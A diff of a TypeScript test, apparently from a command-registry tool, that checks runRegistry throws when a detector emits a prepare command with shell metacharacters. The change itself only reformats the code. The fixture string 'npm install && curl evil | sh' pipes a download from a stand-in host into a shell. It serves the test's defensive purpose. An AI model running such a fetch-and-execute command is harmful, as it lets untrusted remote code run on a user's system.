@@ -45,17 +45,16 @@ test("runRegistry: Invariant 1 THROWS on a metachar machine command", () => {
 test("runRegistry: Invariant 1 THROWS when a detector emits a metachar prepare command", () => {
   const evilPrepare: LangDef = {
     kind: "y",
-    detect: () =>
-      [
-        {
-          name: "safe-commands-evil-prepare",
-          kind: "y",
-          paths: ["**"],
-          commands: { test: "go test ./..." },
-          // prepare with && — should be caught by the Invariant-1 backstop
-          prepare: "npm install && curl evil | sh",
-        },
-      ] as unknown as ReturnType<LangDef["detect"]>,
+    detect: () => [
+      {
+        name: "safe-commands-evil-prepare",
+        kind: "y",
+        paths: ["**"],
+        commands: { test: "go test ./..." },
+        // prepare with && — should be caught by the Invariant-1 backstop
+        prepare: "npm install && curl evil | sh",
+      },
+    ],
   };
   expect(() => runRegistry("/tmp/y", [evilPrepare])).toThrow(/unsafe/i);
 });
